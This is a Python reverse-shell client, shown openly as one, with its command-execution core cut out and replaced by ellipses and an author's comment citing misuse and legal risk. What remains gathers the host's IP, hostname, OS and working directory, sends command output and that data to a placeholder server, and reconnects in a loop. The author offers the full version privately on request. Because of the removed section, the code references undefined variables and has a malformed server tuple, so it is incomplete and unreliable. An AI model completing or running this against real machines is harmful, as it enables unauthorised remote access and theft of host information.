import socket
import subprocess
import time
import select
import platform
from dataclasses import dataclass
import os

SERVER = ("<IP>", <PORT?)

AUTH = "NONE"


@dataclass
class TargetInfo:
    DCLHOST_IP: str
    DCLHOST_HOSTNAME: str
    DCLHOST_OSTYPE: str
    DCLHOST_CD: str

DCLHOST_IP = socket.gethostbyname(socket.gethostname())
DCLHOST_HOSTNAME = socket.gethostname()
DCLHOST_OSTYPE = platform.system()
DCLHOST_CD = os.getcwd()

get_TargetInfo = TargetInfo(
    DCLHOST_IP,
    DCLHOST_HOSTNAME,
    DCLHOST_OSTYPE,
    DCLHOST_CD
)
while True: 
    try:
          ...
          ...
          ...
          ...
          ...
          ...
          ...
          ...
          ...
                #  IMPORTANT NOTICE – CODE REMOVED FOR SAFETY & LEGAL REASONS
                #
                #  The following section originally contained a fully functional
                #  reverse-shell / remote-execution implementation.
                #
                #  I have intentionally deleted this part of the source code to
                #  prevent misuse. Reverse shells are extremely dangerous, can be
                #  weaponized easily, and are commonly used in illegal hacking
                #  activities. I do not want to enable or facilitate any form of
                #  unauthorized access, abuse, or criminal behavior.
                #
                #  Publishing a complete reverse shell publicly may expose me to
                #  legal, ethical, and professional liability, and therefore this
                #  portion is intentionally redacted.
                #
                #  The remaining code is provided strictly for educational,
                #  research, and defensive cybersecurity purposes.
                #
                #  For legitimate, vetted, and lawful professional scenarios
                #  (such as job interviews, security assessments, or controlled
                #  training environments), I may provide the full version
                #  privately upon request — but only after verifying intent and
                #  ensuring proper authorization.
                    ...
                    ...
                    ...
                    ...
                    ...
                    ...
                    ...
                    ...
                    ...
                    output = result.stdout.encode()
                    print(f"DEBUG: Output size = {len(result.stdout.encode())} bytes")

                    response = result.stdout
                    response += "\n\nIP=" + get_TargetInfo.DCLHOST_IP + "\n"
                    response += "HOSTNAME=" + get_TargetInfo.DCLHOST_HOSTNAME + "\n"
                    response += "OS TYPE=" + get_TargetInfo.DCLHOST_OSTYPE + "\n"
                    response += "CWD=" + DCLHOST_CD + "\n"
                    response += "////////////////////////////////////////////////\n"
                    s.sendall(response.encode())

            time.sleep(0.05)
        s.close()
    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):  
        print("Connection lost with server. Reconnecting in 5 seconds...")
        s.close()
        time.sleep(5)
        continue 
    except Exception as e:
        print(f"Failed for reason: {e}. Reconnecting in 15 seconds...")
        try:
            s.close()
        except:
            pass

    time.sleep(15)
